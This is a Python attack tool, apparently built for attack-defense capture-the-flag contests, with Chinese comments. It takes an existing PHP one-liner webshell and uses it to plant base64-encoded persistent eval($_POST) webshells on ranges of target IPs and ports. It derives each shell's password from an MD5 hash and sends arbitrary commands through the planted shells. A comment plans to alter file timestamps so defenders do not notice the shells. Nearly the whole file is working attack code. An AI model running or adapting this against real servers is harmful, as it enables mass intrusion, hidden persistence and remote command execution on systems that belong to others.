#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import string
import random
import base64
import hashlib
import argparse
import itertools
import base64
import re
import sys

##明天解决get 一句话 传参问题

#批量上传一句话
#需要的参数 ip port 已知一句话路径、密码 上传的一句话路径、密码
#最后要将ip 密码 地址 都写到一个 txt中保留 并返回上传成功与否
# 密码在upload中生成
#
#警告 默认函数参数值只能写在最后
#
def upload_shells(ip,already_shell_url,already_shell_pass,new_shell_path,key,pass_base='1',method='post',port='80',protocol='http'):
	proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
	list_shell=[]
	if pass_base == '1':
		new_shell_pass = create_pass(ip,key)
	elif pass_base=='2':
		new_shell_pass = create_pass(port,key)
	else:
		print(pass_base+"-----------")
		new_shell_pass = create_pass(ip,key)
	shell_url_base = protocol+"://"+ip+":"+port+"/"+already_shell_url
	print(shell_url_base)
	#这里只能再写一个正则 好麻烦。
	tag = re.search("[a-zA-Z0-9_-]*.php$",shell_url_base).group(0)
	new_shell_path_base = shell_url_base.replace(tag,"")+new_shell_path
#	print(new_shell_path_base+"----newshell")
	#这里加一个不死马的名臣替换
	#就是不死马的名称和新生成的不死马的名称一样
	#下面就是不死马的读取替换生成
	new_shell_name = re.search("[a-zA-Z0-9_-]{0,50}.php",new_shell_path_base).group(0)
	#解决windows的gbk恶心编码问题 读取文件的时候 encoding=utf-8
	with open("no_die_shell.php","r",encoding='UTF-8') as f:
		shell = f.read()
	#print(shell)
	nodie = "<?php @eval($_POST['{mima}']);?>".format(mima=new_shell_pass)
	replace_target = base64.b64encode(nodie.encode("utf-8")).decode('utf-8')
	nodie_php_s = shell.replace("gink_go.php",new_shell_name).replace("PD9waHAgQGV2YWwoJF9QT1NUWydjbWRkJ10pOyA/Pg==",replace_target)
#	print(nodie_php_s)
	nodie_php_ss = base64.b64encode(nodie_php_s.encode("utf-8")).decode("utf-8")
	if method == 'get':
		payload=already_shell_pass+"="+"file_put_contents('"+new_shell_path+"',base64_decode('"+nodie_php_ss.strip('=')+"'));"
		#这个headers很重要 否则写不进去 另外不死马中如果有中文也可能出错。
		headers={
			'Content-Type':'application/x-www-form-urlencoded'
		}
		shell_url_base_2 = shell_url_base+"?"+payload
		#print(shell_url_base_2)
		try:
			status_code = requests.get(shell_url_base_2,headers=headers,proxies=proxies).status_code
			if status_code==200:
				try:
	#超时问题 就是不死马不能有响应 比如echo 死循环echo requests一直在等待响应 没办法执行timeout
					requests.get(new_shell_path_base,timeout=3)
				except:
					if requests.get(new_shell_path_base,timeout=3).status_code == 200:
						print("----"+new_shell_path_base+"----"+new_shell_pass)
						print("---上传成功---")
					else:
						print("访问不到上传的木马")
			else:
				print("----写马请求状态码不是200----"+status_code)
				pass
		except:
			print("----在与目标机中请求写马失败----")
			pass

	elif method == 'post':
		payload={
			already_shell_pass : "file_put_contents('"+new_shell_path+"',base64_decode('"+nodie_php_ss+"'));"
		}
		#这个headers很重要 否则写不进去 另外不死马中如果有中文也可能出错。
		headers={
			'Content-Type':'application/x-www-form-urlencoded'
		}
		try:
			status_code = requests.post(shell_url_base,data=payload,headers=headers,proxies=proxies).status_code
			if status_code==200:
				try:
	#超时问题 就是不死马不能有响应 比如echo 死循环echo requests一直在等待响应 没办法执行timeout
					requests.get(new_shell_path_base,timeout=3)
				except:
					if requests.get(new_shell_path_base,timeout=3).status_code == 200:
						print("----"+new_shell_path_base+"----"+new_shell_pass)
						print("---上传成功---")
					else:
						pass
			else:
				print("----写马请求状态码不是200----"+status_code)
				pass
		except:
			print("----在与目标机中请求写马失败----")
			pass
	else:
		print('请选择木马是get还是post请求或者是系统调用？')
	# list_shell.append(new_shell_path_base+"----"+new_shell_pass)
	# return list_shell

#这里是基于命令执行上传不死马的
def cmd_upload_shells():
	return

def filebase_upload_shells(already_url,already_pass,new_shell_path,key,pass_base='1',method='post'):
	proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
	if pass_base=='1':
		tag3 = re.search("(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)",already_url)
		ip = tag3.group(0)
		new_shell_pass = create_pass(ip,key)
	elif pass_base=='2':
		print(already_url)
		tag4 = re.search(":[0-9]{2,6}/",already_url)
		port = tag4.group(0).replace("/","").replace(":","")
		new_shell_pass = create_pass(port,key)
	else:
		tag3 = re.search("(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)",already_url)
		ip = tag3.group(0)
		new_shell_pass = create_pass(ip,key)
	#这里写一个正则
	#base_url = re.search("^(https|http)?://([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3})(:[0-9]{1,6})*/",already_url).group(0)
	tag = re.search("[a-zA-Z0-9_-]*.php$",already_url).group(0)
	new_shell_path_base = already_url.replace(tag,"")+new_shell_path
	new_shell_name = re.search("[a-zA-Z0-9_-]{0,50}.php",new_shell_path_base).group(0)
	with open("no_die_shell.php","r",encoding='UTF-8') as f:
		shell = f.read()
	#print(shell)
	nodie = "<?php @eval($_POST['{mima}']);?>".format(mima=new_shell_pass)
	replace_target = base64.b64encode(nodie.encode("utf-8")).decode('utf-8')
	nodie_php_s = shell.replace("gink_go.php",new_shell_name).replace("PD9waHAgQGV2YWwoJF9QT1NUWydjbWRkJ10pOyA/Pg==",replace_target)
#	print(nodie_php_s)
	nodie_php_ss = base64.b64encode(nodie_php_s.encode("utf-8")).decode("utf-8")
	if method == 'get':
		headers={
			'Content-Type':'application/x-www-form-urlencoded'
		}
		payload = already_pass+"="+"file_put_contents('"+new_shell_path+"',base64_decode('"+nodie_php_ss.strip('=')+"'));"
		already_url_2 = already_url+"?"+payload
		print("你的请求："+already_url_2)
		try:
			status_code = requests.get(already_url_2,headers=headers,proxies=proxies).status_code
			if status_code==200:
				try:
					requests.get(new_shell_path_base,timeout=3,proxies=proxies)
				except:
					if requests.get(new_shell_path_base,timeout=3,proxies=proxies).status_code==200:
						print(new_shell_path_base+"----"+new_shell_pass)
						print("----成功上传----")
					else:
						print("上传成功但是访问不到")
						pass
			else:
				print()
				print("----写马请求状态码不是200----"+status_code)
				pass
		except:
			print("----在与目标机中请求写马失败----")
			pass

	else:
		payload={
			already_pass : "file_put_contents('"+new_shell_path+"',base64_decode('"+nodie_php_ss+"'));"
		}
		#这个headers很重要 否则写不进去 另外不死马中如果有中文也可能出错。都是尼玛windows的编码问题。
		headers={
			'Content-Type':'application/x-www-form-urlencoded'
		}
		try:
			status_code = requests.post(already_url,data=payload,headers=headers,proxies=proxies).status_code
			if status_code==200:
				try:
					requests.get(new_shell_path_base,timeout=3,proxies=proxies)
					print(new_shell_path_base)
				except:
					if requests.get(new_shell_path_base,timeout=3,proxies=proxies).status_code==200:
						print(new_shell_path_base+"----"+new_shell_pass)
						print("----成功上传----")
					else:
						print("上传成功但是访问不到")
						pass
			else:
				print("----写马请求状态码不是200----"+status_code)
				pass
		except:
			print("----在与目标机中请求写马失败----")
			pass
# 生成 MD5 密码 需要 ip 和 key 来生成不同的MD5
# 为什么 不随机生成 这样的好处是 写批量提交脚本 就知道 哪个 ip的 木马 密码是 ip——my_key的MD5 很方便
# 不然容易搞混
def create_pass(ip_or_port,my_key):
	password = curlmd5(ip_or_port+my_key)
	return password


# 指定一个文件的修改时间 touch -d "2008-07-11 03:41:10" test.txt
# 追加内容到隐蔽的php文件 然后修改时间 防止被防守方轻易知晓
def add_text_to_php(ip,port,already_shell_path,already_shell_pass,file_path,time):
	return
# 支持两种模式 一个 文件txt 类似http://192.168.254.250/asd/1.php
# 另一个是 ip段 192.168.0-22.0-22 
# 最后是和ip list 两个循环 当然 如何是文件的话就算了


# 这里让用户提供语句 否则 语句种类太多 写起来很麻烦 
# 另外 用户提供语句 可以把这个函数的扩展性 搞得飞起，你也可以直接拿他来get flag 嘿嘿
#  而且兼容命令执行
def shell_reverse(ip,port,protocol,already_shell_path,already_pass,shell,method,b64):
	if b64 == '1':
		shell = base64.b64decode(shell.encode("utf-8")).decode("utf-8")
		print(shell)
	proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
	if method == 'get':
		headers={
			'Content-Type':'application/x-www-form-urlencoded'
		}
		payload = protocol+"://"+ip+":"+port+"/"+already_shell_path+"?"+already_pass+"="+shell
		print('--payload:--'+payload+'----')
		try:
			result = requests.get(payload.replace('&','%26'),headers=headers,proxies=proxies,timeout=3).text
			print(result)
			return result
		except:
			pass
	elif method == 'post':
		url = protocol+"://"+ip+":"+port+"/"+already_shell_path
		headers={
			'Content-Type':'application/x-www-form-urlencoded'
		}
		payload={
			already_pass : shell
		}
		try:
			result = requests.post(url,headers=headers,data=payload,proxies=proxies,timeout=3).text
			print(result)
			return result
		except:
			pass
	else:
		a='说明你的 method 有问题'
		return None

def get_parse_ips(ips):
	#实现 , 分割ip
	if ',' in ips:
		list_ip = ips.split(',')
		return list_ip
	else:
		ips_create = lambda x: ["%d.%d.%d.%d"%d for d in itertools.product(*[range(m,n+1) for s in x.split(".") for m,n,*_ in [map(int, (s+"-"+s).split("-"))]])]
		return ips_create(ips)
#返回一个ip list

def get_para_ports(ports):
	if ',' in ports:
		list_port = ports.split(',')
	else:
		list_port=[]
		for i in range(int(ports.split("-")[0]),int(ports.split("-")[1])+1):
			list_port.append(str(i))
	return list_port


## 下面的都是加密函数
def curlmd5(strss):
	m = hashlib.md5()
	m.update(strss.encode('UTF-8'))
	return m.hexdigest()
if __name__ == '__main__':
	# 明天先把传参给搞定
	# python example.py -i -I ip[支持ip段] -p -P端口[支持端口段] 
	# -dir 存在的一句话地址 -pass[存在的一句话的密码]  -key 加密的密钥[MD5 ip+密钥] 
	#这里传入的都是相对路径 都是基于ip new_shell_path是基于 原来马的地址的
	#python awd_all_in_one.py -ip 192.168.14.128 -port 80 --dir upload/3_1.php --dir2 44756-a.php --password cmd -key gink --ptl http --pass_base 1  
	#python awd_all_in_one.py -ips 192.168.14.133,192.168.14.134,192.168.14.135 -port 80 --dir upload/3_1.php --dir2 ../test/233.php --password cmd -key ginkgo --ptl http --pass_base 1
	#python awd_all_in_one.py -ips 192.168.14.128 -port 80 --dir upload/3_1.php --dir2 ../test/233.php --password cmd -key ginkgo --ptl http --pass_base 1
	#python awd_all_in_one.py -ips 192.168.14.133-135 -port 80 --dir upload/3_1.php --dir2 ../233.php --password cmd -key ginkgo --ptl http --pass_base 1
	#python awd_all_in_one.pt -ip 192.168.14.128 -port 80 --dir upload/aa-1.php --dir2 ./a.php --password cmd -key ginkgo --ptl http --pass_base 1 -method get
	parser = argparse.ArgumentParser()
	parser.add_argument("-ip")
	parser.add_argument("-ips") #支持 - 和 , 
	parser.add_argument("-port")
	parser.add_argument("-shell")
	parser.add_argument("-ports")
	parser.add_argument("-f")
	parser.add_argument("-b64")
	parser.add_argument("--dir")
	parser.add_argument("-method")
	parser.add_argument("-shell_method")
	parser.add_argument("--password")
	parser.add_argument("--dir2")
	parser.add_argument("-key")
	parser.add_argument("--ptl") # 支持http 协议
	parser.add_argument("--pass_base")
	results = parser.parse_args()
	ip = results.ip
	ips = results.ips
	port = results.port
	ports = results.ports
	url_shell_dir = results.dir
	shell_pass = results.password
	md5_key = results.key
	protocol = results.ptl
	file_name = results.f
	pass_base = results.pass_base
	new_shell_path = results.dir2
	method = results.method
	shell = results.shell
	shell_method = results.shell_method
	b64 = results.b64
	if b64 == None:
		b64 = '0'
	if protocol == None:
		protocol = "http"
	if method == None:
		method = 'post'
	if pass_base == None:
		pass_base = '1'
	if port == None and ports == None:
		port = '80'
	if shell_method == None:
		shell_method = 'post'
	#专门用来处理文件一句话的
	#格式 http://127.0.0.1/1.php 445
	#python awd_all_in_one.py -f test.txt --dir2 ./test233.php -key 445 --pass_base 1
	if method == 'get':
		if file_name !=None:
			with open(file_name,"r",encoding='UTF-8') as f:
				for base_all in f.readlines():
					already_url = base_all.strip("\n").split(" ")[0]
					already_pass = base_all.strip("\n").split(" ")[1]
					filebase_upload_shells(already_url,already_pass,new_shell_path,md5_key,pass_base,method)
			sys.exit()

		if ip != None:
			#就不用考虑ips了
			if port != None:
				upload_shells(ip,url_shell_dir,shell_pass,new_shell_path,md5_key,pass_base,method,port,protocol)
			elif port == None:
				if ports != None:
					list_port = get_para_ports(ports) #记得实现 ips 转换 ip 列表的函数
					for i in list_port:
						upload_shells(ip,url_shell_dir,shell_pass,new_shell_path,md5_key,pass_base,method,i,protocol)
				else:
					print("参数错误")
			else:
				print("参数错误")

		else:
			list_ip = get_parse_ips(ips)
			for i_p in list_ip:
				#print(list_ip)
				upload_shells(i_p,url_shell_dir,shell_pass,new_shell_path,md5_key,pass_base,method,port,protocol)


	elif method == 'post':
		if file_name !=None:
			with open(file_name,"r",encoding='UTF-8') as f:
				for base_all in f.readlines():
					already_url = base_all.strip("\n").split(" ")[0]
					already_pass = base_all.strip("\n").split(" ")[1]
					filebase_upload_shells(already_url,already_pass,new_shell_path,md5_key,pass_base,method)
			sys.exit()

		if ip != None:
			#就不用考虑ips了
			if port != None:
				upload_shells(ip,url_shell_dir,shell_pass,new_shell_path,md5_key,pass_base,method,port,protocol)
			elif port == None:
				if ports != None:
					list_port = get_para_ports(ports) #记得实现 ips 转换 ip 列表的函数
					for i in list_port:
						upload_shells(ip,url_shell_dir,shell_pass,new_shell_path,md5_key,pass_base,method,i,protocol)
				else:
					print("参数错误")
			else:
				print("参数错误")

		else:
			list_ip = get_parse_ips(ips)
			for i_p in list_ip:
				#print(list_ip)
				upload_shells(i_p,url_shell_dir,shell_pass,new_shell_path,md5_key,pass_base,method,port,protocol)
	#python awd_all_in_one.py -ip 192.168.14.128 --dir upload/aa-1.php --password cmd -method shell -shell_method get -shell "system('whoami');";
	#python awd_all_in_one.py -ips 192.168.14.128,192.168.14.133,192.168.14.134 --dir upload/aa-1.php --password cmd -method shell -shell_method get -shell "system('whoami');"
	elif method == 'shell':
		if ip != None:
			#就不用考虑ips了
			if port != None:
				print(ip+":"+port+":"+url_shell_dir)
				shell_reverse(ip,port,protocol,url_shell_dir,shell_pass,shell,shell_method,b64)
			elif port == None:
				if ports != None:
					list_port = get_para_ports(ports) #记得实现 ips 转换 ip 列表的函数
					for i in list_port:
						shell_reverse(ip,i,protocol,url_shell_dir,shell_pass,shell,shell_method,b64)
				else:
					print("参数错误")
			else:
				print("参数错误")
		else:
			list_ip = get_parse_ips(ips)
			print(list_ip)
			for i_p in list_ip:
				shell_reverse(i_p,port,protocol,url_shell_dir,shell_pass,shell,shell_method,b64)
	else:
		print("请指明调用的模块")